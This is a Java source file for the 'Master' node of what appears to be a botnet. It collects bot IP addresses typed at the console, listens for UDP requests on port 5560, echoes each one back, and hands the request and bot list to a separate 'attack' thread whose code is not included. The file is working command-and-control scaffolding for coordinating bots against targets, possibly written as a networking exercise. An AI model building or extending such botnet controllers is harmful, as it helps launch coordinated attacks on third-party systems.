import java.io.IOException;
import java.net.*;
import java.util.ArrayList;
import java.util.Scanner;


public class Master {

	
	public static void main(String[] args) {
		
		//-------------------------------- VARIABLES --------------------------------//

		ArrayList<InetAddress> bot_list = new ArrayList<InetAddress>();
		DatagramSocket master_socket = null;
		Scanner sc = new Scanner(System.in);
		
		try {

			master_socket = new DatagramSocket(5560);
			byte[] buffer = new byte[1000];

			String new_bot = null;
			while (true) {
				
				System.out.println("Insert a bot IP to update bot list (write 'end' to end the list):");
				new_bot = sc.nextLine();
				
				if (new_bot.equals("end"))
					break;
				
				try {
					bot_list.add(InetAddress.getByName(new_bot));
				} catch (UnknownHostException UHe) {
					System.out.println("Bot IP error: "+UHe.toString());
				}	
				
			}
			
			while (true) {
				
				//---------------------------- RECEIVE REQUEST (UDP) -----------------------//
				
				System.out.println("Waiting for request...");
				// DatagramPacket to receive request
				DatagramPacket request = new DatagramPacket(buffer, buffer.length);

				// Reading request
				master_socket.receive(request);
				System.out.println("Accepting request.");

				System.out.println("Received datagram from host: "+request.getAddress().toString().replace("/", ""));

				
				//---------------------------- REPLY CLIENT (UDP) -----------------------//
				
				// DatagramPacket to send client reply
				DatagramPacket client_reply = new DatagramPacket(request.getData(), request.getLength(), request.getAddress(), request.getPort());

				// Client_reply (eco)
				master_socket.send(client_reply);
				
				
				//---------------------------- PROCESS REQUEST -----------------------//
				
				// New thread
				Thread attack = new Thread(new ThreadServer(request, bot_list));
				attack.start();	
				
			}

		} catch (SocketException Se) {
			System.out.println("Socket error: " + Se.getMessage());
		} catch (IOException IOe) {
			System.out.println("IO error: " + IOe.getMessage());
		}	
		
	}

}
